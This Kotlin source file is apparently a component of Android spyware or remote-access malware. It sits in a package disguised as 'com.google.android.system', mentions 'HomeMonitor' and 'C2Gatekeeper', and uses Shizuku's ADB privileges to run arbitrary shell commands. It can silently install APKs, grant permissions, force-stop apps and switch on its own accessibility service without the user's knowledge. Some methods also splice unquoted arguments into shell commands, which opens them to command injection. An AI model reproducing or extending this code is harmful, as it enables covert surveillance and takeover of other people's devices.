package com.google.android.system

import android.content.pm.PackageManager
import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import rikka.shizuku.Shizuku
import java.io.BufferedReader
import java.io.InputStreamReader

/**
 * ShizukuSystemEngine
 *
 * Root-Less ADB-Privileged System Operations Engine (FEAT-03):
 * - Interacts with Shizuku binder service (dev.rikka.shizuku:api).
 * - Executes ADB shell commands with ADB privileges without full device root.
 * - Supports silent APK installation, background permission granting, force-stopping apps, and screen capture.
 * - Features graceful fallback diagnostics when Shizuku is not running on device.
 */
object ShizukuSystemEngine {

    private const val TAG = "ShizukuSystemEngine"

    data class ShizukuStatusReport(
        val isBinderAvailable: Boolean,
        val isPermissionGranted: Boolean,
        val statusMessage: String
    )

    /**
     * Checks if Shizuku binder service is running and active on device.
     */
    fun isShizukuAvailable(): Boolean {
        return try {
            Shizuku.pingBinder()
        } catch (_: Throwable) {
            false
        }
    }

    /**
     * Checks if HomeMonitor has been granted Shizuku ADB permission.
     */
    fun hasShizukuPermission(): Boolean {
        if (!isShizukuAvailable()) return false
        return try {
            Shizuku.checkSelfPermission() == PackageManager.PERMISSION_GRANTED
        } catch (_: Throwable) {
            false
        }
    }

    /**
     * Obtains full Shizuku status report.
     */
    fun getStatusReport(): ShizukuStatusReport {
        val available = isShizukuAvailable()
        val granted = if (available) hasShizukuPermission() else false

        val msg = when {
            !available -> "Unavailable 🔴 (Shizuku service is not running)"
            !granted -> "Not Granted 🟡 (Shizuku running, permission pending)"
            else -> "Active & Granted 🟢 (Full ADB Privileges Unlocked)"
        }

        return ShizukuStatusReport(
            isBinderAvailable = available,
            isPermissionGranted = granted,
            statusMessage = msg
        )
    }

    /**
     * Executes an arbitrary ADB shell command with Shizuku privileges.
     */
    suspend fun executeAdbCommand(command: String): String = withContext(Dispatchers.IO) {
        val cleanCmd = command.trim()
        if (cleanCmd.isBlank()) return@withContext "⚠️ Empty command provided."

        if (!isShizukuAvailable()) {
            return@withContext "⚠️ **Shizuku Error**: Shizuku service is not running on target device."
        }

        if (!hasShizukuPermission()) {
            return@withContext "⚠️ **Shizuku Error**: Shizuku is active but permission is NOT granted. Grant permission in C2Gatekeeper or Shizuku app."
        }

        return@withContext try {
            val method = Shizuku::class.java.getDeclaredMethod(
                "newProcess",
                Array<String>::class.java,
                Array<String>::class.java,
                String::class.java
            )
            method.isAccessible = true
            val process = method.invoke(null, arrayOf("sh", "-c", cleanCmd), null, null) as Process

            val reader = BufferedReader(InputStreamReader(process.inputStream))
            val errReader = BufferedReader(InputStreamReader(process.errorStream))

            val sb = StringBuilder()
            var line: String?
            while (reader.readLine().also { line = it } != null) {
                sb.append(line).append("\n")
            }

            val errSb = StringBuilder()
            while (errReader.readLine().also { line = it } != null) {
                errSb.append(line).append("\n")
            }

            process.waitFor()
            val output = sb.toString().trim()
            val errorOutput = errSb.toString().trim()

            when {
                output.isNotBlank() && errorOutput.isNotBlank() -> "Output:\n```\n$output\n```\nError Output:\n```\n$errorOutput\n```"
                output.isNotBlank() -> "```\n$output\n```"
                errorOutput.isNotBlank() -> "⚠️ **ADB Error Output:**\n```\n$errorOutput\n```"
                else -> "✅ **Command executed successfully.** (No output returned)"
            }
        } catch (e: Throwable) {
            Log.e(TAG, "executeAdbCommand exception: ${e.message}", e)
            "❌ **Shizuku Execution Failed:** `${e.message}`"
        }
    }

    /**
     * Silently grants a runtime permission to a package via `pm grant`.
     */
    suspend fun grantPermission(packageName: String, permission: String): String {
        val cmd = "pm grant $packageName $permission"
        return executeAdbCommand(cmd)
    }

    /**
     * Force-stops a package via `am force-stop`.
     */
    suspend fun forceStopApp(packageName: String): String {
        val cmd = "am force-stop $packageName"
        return executeAdbCommand(cmd)
    }

    /**
     * Silently installs an APK file via `pm install -r`.
     */
    suspend fun installApkSilently(apkPath: String): String {
        val cmd = "pm install -r '$apkPath'"
        return executeAdbCommand(cmd)
    }

    /**
     * Silently enables Accessibility Service via ADB shell settings.
     */
    suspend fun autoEnableAccessibilityService(packageName: String = "com.google.android.system"): String {
        val serviceName = "$packageName/com.google.android.system.AppAccessibilityService"
        val cmd = "settings put secure enabled_accessibility_services $serviceName && settings put secure accessibility_enabled 1"
        return executeAdbCommand(cmd)
    }
}
